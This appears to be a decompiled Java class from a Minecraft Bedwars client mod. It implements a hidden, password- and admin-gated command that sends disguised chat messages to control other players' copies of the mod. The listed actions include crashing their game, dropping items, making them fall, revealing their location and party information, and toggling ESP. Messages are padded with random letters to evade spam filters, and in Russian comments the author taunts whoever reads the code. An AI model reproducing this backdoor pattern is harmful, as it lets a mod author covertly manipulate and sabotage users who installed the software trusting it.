/*     */ package com.dimchig.bedwarsbro.dimchigspecial;
/*     */ 
/*     */ import com.dimchig.bedwarsbro.ChatSender;
/*     */ import com.dimchig.bedwarsbro.Main;
/*     */ import com.dimchig.bedwarsbro.MyChatListener;
/*     */ import com.dimchig.bedwarsbro.OnMyTickEvent;
/*     */ import com.dimchig.bedwarsbro.gui.ManipulatorGui;
/*     */ import com.dimchig.bedwarsbro.hints.HintsValidator;
/*     */ import net.minecraft.client.Minecraft;
/*     */ import net.minecraft.client.gui.GuiScreen;
/*     */ import net.minecraft.command.CommandBase;
/*     */ import net.minecraft.command.CommandException;
/*     */ import net.minecraft.command.ICommandSender;
/*     */ import net.minecraft.entity.player.InventoryPlayer;
/*     */ import net.minecraft.item.Item;
/*     */ import net.minecraft.item.ItemStack;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class CommandManipulate
/*     */   extends CommandBase
/*     */ {
/*  34 */   public static String command_text = "bwmanipulate";
/*     */   
/*     */   public CommandManipulate() {
/*  37 */     this; this; command_text = command_text.replace("/", "");
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean func_71519_b(ICommandSender sender) {
/*  42 */     return true;
/*     */   }
/*     */ 
/*     */   
/*     */   public String func_71517_b() {
/*  47 */     this; return command_text;
/*     */   }
/*     */ 
/*     */   
/*     */   public String func_71518_a(ICommandSender sender) {
/*  52 */     return "Manipulate";
/*     */   }
/*     */ 
/*     */   
/*     */   public void sendCommand(String nick, String cmd_s) {
/*  57 */     boolean isforPartyChat = false;
/*  58 */     String cmd = "none";
/*  59 */     if (cmd_s.contains("pc")) {
/*  60 */       cmd = cmd_s.replace("pc", "").trim();
/*  61 */       isforPartyChat = true;
/*     */     } else {
/*  63 */       cmd = cmd_s;
/*  64 */     }  if (cmd.equals("none")) {
/*  65 */       ChatSender.addText("&cНету команды &e" + cmd + "&c!");
/*     */       
/*     */       return;
/*     */     } 
/*  69 */     Main.playerManipulator.updatePrefix();
/*  70 */     PlayerManipulator.COMMAND command = PlayerManipulator.COMMAND.getById(cmd);
/*     */     
/*  72 */     String text = Main.playerManipulator.getCommand(nick, command);
/*  73 */     if (text == null) {
/*  74 */       ChatSender.addText("Ошибка!");
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */       
/*     */       return;
/*     */     } 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/*  86 */     String text2send = text;
/*  87 */     if (isforPartyChat) { text2send = "/pc " + text; }
/*     */     else
/*  89 */     { String antispam = "";
/*  90 */       String letters = "abcdefghijklmnopqrstuvwxyz";
/*     */       
/*  92 */       for (int i = 0; i < 95 - text.length(); i++) {
/*  93 */         antispam = antispam + letters.charAt((Minecraft.func_71410_x()).field_71441_e.field_73012_v.nextInt(letters.length()));
/*     */       }
/*  95 */       text2send = antispam + text;
/*  96 */       if (MyChatListener.IS_IN_GAME) text2send = "!" + text2send;  }
/*     */     
/*  98 */     ChatSender.sendText(text2send);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public void func_71515_b(ICommandSender sender, String[] args) throws CommandException {
/* 104 */     if (!isOk()) {
/* 105 */       ChatSender.addText("&cLobby &8▸ &fНеизвестная команда.");
/*     */       
/*     */       return;
/*     */     } 
/* 109 */     if (args.length != 2) {
/* 110 */       OnMyTickEvent.gui2open = (GuiScreen)new ManipulatorGui();
/* 111 */       boolean isCodeCheckerGay = true;
/* 112 */       if (isCodeCheckerGay)
/* 113 */         return;  this; ChatSender.addText("/" + command_text + " &eник &7[&bкоманда] &7(или &epc&b1&7)");
/* 114 */       ChatSender.addText("&b1 &7- &eливнет");
/* 115 */       ChatSender.addText("&b2 &7- &eскажет инфу про местоположение");
/* 116 */       ChatSender.addText("&b3 &7- &aвключить  &eHitBlock");
/* 117 */       ChatSender.addText("&b4 &7- &cвыключить &eHitBlock");
/* 118 */       ChatSender.addText("&b5 &7- &eсказать свою версию мода");
/* 119 */       ChatSender.addText("&b6 &7- &eкрашнуть ему игру");
/* 120 */       ChatSender.addText("&b7 &7- &eдропнуть слот");
/* 121 */       ChatSender.addText("&b8 &7- &eупасть с моста");
/* 122 */       ChatSender.addText("&b9 &7- &eинфа про пати");
/* 123 */       ChatSender.addText("&ba &7- &eвключить esp");
/* 124 */       ChatSender.addText("Привет лошок, который открыл этот код) Мой мод - мои правила");
/* 125 */       ChatSender.addText("Я буду делать что хочу, так как я никого не принуждаю скачивать этот мод");
/* 126 */       ChatSender.addText("И это просто тролинг игроков, не более");
/* 127 */       ChatSender.addText("Привет всем от DimChig, кто смотрит этот скриншот!");
/*     */       
/*     */       return;
/*     */     } 
/*     */     try {
/* 132 */       String nick = args[0];
/* 133 */       String cmd_s = args[1];
/*     */ 
/*     */       
/* 136 */       sendCommand(nick, cmd_s);
/*     */     }
/* 138 */     catch (Exception ex) {
/* 139 */       ChatSender.addText("Ошибка! " + ex.getLocalizedMessage());
/*     */       return;
/*     */     } 
/*     */   }
/*     */   
/*     */   public boolean isOk() {
/* 145 */     if (!HintsValidator.isPasswordCorrect() || Minecraft.func_71410_x().func_71356_B() || !Main.namePlateRenderer.isBroCurrentAdmin()) return false; 
/* 146 */     for (int i = 0; i < InventoryPlayer.func_70451_h(); i++) {
/* 147 */       ItemStack stack = (Minecraft.func_71410_x()).field_71439_g.field_71071_by.field_70462_a[i];
/* 148 */       if (stack != null) {
/* 149 */         Item item = stack.func_77973_b();
/* 150 */         if (item != null && 
/* 151 */           stack.func_82833_r() != null)
/* 152 */           return true; 
/*     */       } 
/* 154 */     }  return false;
/*     */   }
/*     */ }


/* Location:              C:\Users\1337a\Downloads\bedwarsbro-1.69.2.jar!\com\dimchig\bedwarsbro\dimchigspecial\CommandManipulate.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */